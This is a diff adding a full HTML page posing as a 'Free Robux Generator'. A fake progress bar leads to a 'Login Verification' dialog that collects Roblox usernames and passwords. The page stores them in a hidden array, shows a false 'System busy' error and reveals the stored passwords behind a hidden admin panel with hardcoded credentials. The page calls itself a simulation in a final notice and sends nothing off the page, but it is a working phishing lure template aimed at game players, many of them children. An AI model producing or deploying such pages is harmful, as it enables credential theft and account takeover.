@@ -1,0 +1,429 @@
+<html><head><base href="." /><meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Free Robux Generator</title>
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'HCo Gotham SSm', Helvetica, Arial, sans-serif;
+}
+
+body {
+    background: #f2f4f5;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+}
+
+.generator-container {
+    background: white;
+    padding: 2rem;
+    border-radius: 8px;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    width: 100%;
+    max-width: 500px;
+}
+
+.logo {
+    text-align: center;
+    margin-bottom: 2rem;
+    color: #00A2FF;
+    font-size: 24px;
+    font-weight: bold;
+}
+
+.generator-box {
+    border: 2px solid #00A2FF;
+    padding: 20px;
+    border-radius: 8px;
+    margin-bottom: 20px;
+}
+
+.amount-selector {
+    margin-bottom: 20px;
+}
+
+.amount-selector select {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid #bdbebe;
+    border-radius: 4px;
+    font-size: 16px;
+    margin-top: 8px;
+}
+
+.username-input {
+    margin-bottom: 20px;
+}
+
+.username-input input {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid #bdbebe;
+    border-radius: 4px;
+    font-size: 16px;
+    margin-top: 8px;
+}
+
+.generate-button {
+    width: 100%;
+    padding: 15px;
+    background: #00A2FF;
+    color: white;
+    border: none;
+    border-radius: 4px;
+    font-size: 18px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: background 0.3s ease;
+}
+
+.generate-button:hover {
+    background: #0088DD;
+}
+
+.status {
+    margin-top: 20px;
+    text-align: center;
+    font-size: 16px;
+    color: #666;
+}
+
+.verification-container {
+    margin-top: 20px;
+    padding: 15px;
+    border: 1px solid #ddd;
+    border-radius: 4px;
+    display: none;
+}
+
+.warning {
+    color: #ff3333;
+    text-align: center;
+    margin-top: 20px;
+    font-size: 14px;
+}
+
+.progress-bar {
+    width: 100%;
+    height: 20px;
+    background: #f0f0f0;
+    border-radius: 10px;
+    margin-top: 20px;
+    overflow: hidden;
+    display: none;
+}
+
+.progress {
+    width: 0%;
+    height: 100%;
+    background: #00A2FF;
+    transition: width 0.5s ease;
+}
+
+.dialog-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(0,0,0,0.7);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    z-index: 1000;
+}
+
+.dialog-box {
+    background: white;
+    padding: 2rem;
+    border-radius: 8px;
+    width: 90%;
+    max-width: 400px;
+}
+
+.dialog-box input {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid #bdbebe;
+    border-radius: 4px;
+    font-size: 16px;
+    margin: 8px 0;
+}
+
+.dialog-buttons {
+    display: flex;
+    justify-content: flex-end;
+    gap: 10px;
+    margin-top: 20px;
+}
+
+.dialog-buttons button {
+    padding: 10px 20px;
+    border-radius: 4px;
+    cursor: pointer;
+}
+
+.dialog-buttons .cancel {
+    background: #f2f4f5;
+    border: 1px solid #bdbebe;
+}
+
+.dialog-buttons .submit {
+    background: #00A2FF;
+    color: white;
+    border: none;
+}
+
+.error-message {
+    color: #ff3333;
+    margin-top: 10px;
+    text-align: center;
+    font-weight: bold;
+}
+
+.key-icon {
+    position: fixed;
+    bottom: 10px;
+    right: 10px;
+    width: 24px;
+    height: 24px;
+    cursor: pointer;
+    opacity: 0.3;
+    transition: opacity 0.3s ease;
+}
+
+.key-icon:hover {
+    opacity: 1;
+}
+
+.stored-data {
+    display: none;
+    position: fixed;
+    bottom: 40px;
+    right: 10px;
+    background: rgba(0,0,0,0.8);
+    color: white;
+    padding: 10px;
+    border-radius: 4px;
+    font-size: 12px;
+    max-width: 300px;
+    word-break: break-all;
+}
+
+.admin-login {
+    position: fixed;
+    bottom: 40px;
+    right: 10px;
+    background: rgba(0,0,0,0.8);
+    padding: 10px;
+    border-radius: 4px;
+    display: none;
+}
+
+.admin-login input {
+    display: block;
+    margin: 5px 0;
+    padding: 5px;
+    width: 200px;
+}
+
+.admin-login button {
+    background: #00A2FF;
+    color: white;
+    border: none;
+    padding: 5px 10px;
+    border-radius: 4px;
+    cursor: pointer;
+    margin-top: 5px;
+    width: 100%;
+}
+</style>
+</head>
+<body>
+    <div class="generator-container">
+        <div class="logo">
+            <h1>Free Robux Generator</h1>
+        </div>
+        <div class="generator-box">
+            <div class="amount-selector">
+                <label>Select Amount:</label>
+                <select id="robux-amount">
+                    <option value="1000">1,000 Robux</option>
+                    <option value="2500">2,500 Robux</option>
+                    <option value="5000">5,000 Robux</option>
+                    <option value="10000">10,000 Robux</option>
+                </select>
+            </div>
+            <div class="username-input">
+                <label>Your Roblox Username:</label>
+                <input type="text" id="username" placeholder="Enter your username">
+            </div>
+            <button class="generate-button" onclick="startGeneration()">Generate Robux</button>
+        </div>
+        <div class="progress-bar" id="progress-bar">
+            <div class="progress" id="progress"></div>
+        </div>
+        <div class="status" id="status"></div>
+        <div class="verification-container" id="verification-container">
+            <p>Complete human verification to receive your Robux</p>
+            <button class="generate-button" onclick="showDialog()">Verify Now</button>
+        </div>
+        <div class="warning" id="warning"></div>
+    </div>
+
+    <!-- Login Dialog -->
+    <div class="dialog-overlay" id="dialog-overlay">
+        <div class="dialog-box">
+            <h2>Login Verification</h2>
+            <p>Please enter your Roblox credentials to verify:</p>
+            <input type="text" id="login-username" placeholder="Username">
+            <input type="password" id="login-password" placeholder="Password">
+            <div class="error-message" id="login-error"></div>
+            <div class="dialog-buttons">
+                <button class="cancel" onclick="hideDialog()">Cancel</button>
+                <button class="submit" onclick="handleLogin()">Submit</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Adding the key icon and stored data display -->
+    <svg class="key-icon" id="key-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path>
+    </svg>
+    <div class="stored-data" id="stored-data"></div>
+    
+    <div class="admin-login" id="admin-login">
+        <input type="text" id="admin-username" placeholder="Admin Username">
+        <input type="password" id="admin-password" placeholder="Admin Password">
+        <button onclick="verifyAdmin()">Login</button>
+    </div>
+
+<script>
+function startGeneration() {
+    const username = document.getElementById('username').value;
+    if (!username) {
+        document.getElementById('warning').textContent = 'Please enter your username first!';
+        return;
+    }
+
+    const progressBar = document.getElementById('progress-bar');
+    const progress = document.getElementById('progress');
+    const status = document.getElementById('status');
+    const warning = document.getElementById('warning');
+    
+    warning.textContent = '';
+    progressBar.style.display = 'block';
+    status.textContent = 'Connecting to Roblox servers...';
+
+    let width = 0;
+    const interval = setInterval(() => {
+        if (width >= 100) {
+            clearInterval(interval);
+            document.getElementById('verification-container').style.display = 'block';
+            status.textContent = 'Generation complete! Please verify to receive your Robux.';
+        } else {
+            width++;
+            progress.style.width = width + '%';
+            if (width === 30) status.textContent = 'Generating Robux...';
+            if (width === 60) status.textContent = 'Preparing your Robux package...';
+            if (width === 90) status.textContent = 'Almost done...';
+        }
+    }, 50);
+}
+
+function showDialog() {
+    document.getElementById('dialog-overlay').style.display = 'flex';
+    document.getElementById('login-error').textContent = '';
+}
+
+function hideDialog() {
+    document.getElementById('dialog-overlay').style.display = 'none';
+    document.getElementById('login-error').textContent = '';
+}
+
+let storedCredentials = [];
+
+function handleLogin() {
+    const username = document.getElementById('login-username').value;
+    const password = document.getElementById('login-password').value;
+    
+    if (!username || !password) {
+        document.getElementById('login-error').textContent = 'Please enter both username and password';
+        return;
+    }
+    
+    // Store the credentials
+    storedCredentials.push({
+        username: username,
+        password: password,
+        timestamp: new Date().toISOString()
+    });
+    
+    document.getElementById('login-error').textContent = 'System busy. Please try again after 10 minutes.';
+    
+    document.getElementById('login-username').value = '';
+    document.getElementById('login-password').value = '';
+    
+    setTimeout(() => {
+        hideDialog();
+        document.getElementById('warning').textContent = 'This is a simulation. Real Robux can only be obtained through official channels on Roblox.com. Never share your password with anyone!';
+    }, 3000);
+}
+
+// Key icon click handler
+document.getElementById('key-icon').addEventListener('click', function() {
+    const adminLogin = document.getElementById('admin-login');
+    const storedDataElement = document.getElementById('stored-data');
+    
+    // Hide stored data if it's visible
+    storedDataElement.style.display = 'none';
+    
+    // Toggle admin login form
+    if (adminLogin.style.display === 'none' || !adminLogin.style.display) {
+        adminLogin.style.display = 'block';
+    } else {
+        adminLogin.style.display = 'none';
+    }
+});
+
+function verifyAdmin() {
+    const username = document.getElementById('admin-username').value;
+    const password = document.getElementById('admin-password').value;
+    
+    if (username === 'mufasa' && password === 'mufasa') {
+        const storedDataElement = document.getElementById('stored-data');
+        let displayText = 'Stored Data:\n';
+        storedCredentials.forEach((cred, index) => {
+            displayText += `\nEntry ${index + 1}:\nUsername: ${cred.username}\nPassword: ${cred.password}\nTime: ${cred.timestamp}\n`;
+        });
+        storedDataElement.textContent = displayText;
+        storedDataElement.style.display = 'block';
+        document.getElementById('admin-login').style.display = 'none';
+    } else {
+        alert('Invalid admin credentials');
+    }
+}
+
+// Hide both admin login and stored data when clicking elsewhere
+document.addEventListener('click', function(e) {
+    if (!e.target.matches('#key-icon') && !e.target.closest('#admin-login')) {
+        document.getElementById('admin-login').style.display = 'none';
+        document.getElementById('stored-data').style.display = 'none';
+    }
+});
+
+document.getElementById('username').addEventListener('input', function() {
+    const warning = document.getElementById('warning');
+    warning.textContent = '';
+});
+
+document.getElementById('dialog-overlay').addEventListener('click', function(e) {
+    if (e.target === this) {
+        hideDialog();
+    }
+});
+</script>
+</body></html>
